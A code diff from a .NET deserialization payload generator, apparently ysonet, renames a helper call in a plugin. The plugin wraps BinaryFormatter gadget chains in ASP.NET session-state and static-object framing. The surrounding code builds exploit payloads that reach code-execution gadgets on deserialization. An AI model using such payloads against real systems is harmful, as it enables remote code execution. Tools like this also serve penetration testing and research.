@@ -102,8 +102,8 @@ namespace ysonet.Plugins
                     // marker to 20 so AltSerialization.ReadValueFromStream BF-deserializes those bytes
                     // on read, reaching the same gadget as the object path. The framing offsets are
                     // fixed by the empty key and the byte[] header (independent of the blob length), so
-                    // the magic numbers hold for any blob. GenerateWithNoTest honors inputArgs.Minify.
-                    byte[] bfBytes = (byte[])new TypeConfuseDelegateGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+                    // the magic numbers hold for any blob. GenerateInner honors inputArgs.Minify.
+                    byte[] bfBytes = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", inputArgs);
                     byte[] tempPayload = new byte[bfBytes.Length + 1]; // one trailing byte fixes the length
                     bfBytes.CopyTo(tempPayload, 0);
                     System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
@@ -145,7 +145,7 @@ namespace ysonet.Plugins
             else
             {
                 // HttpStaticObjectsCollection
-                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateInner("BinaryFormatter", inputArgs);
                 byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                 serializedData.CopyTo(newSerializedData, 7);
                 newSerializedData[0] = 1; // for ReadInt32
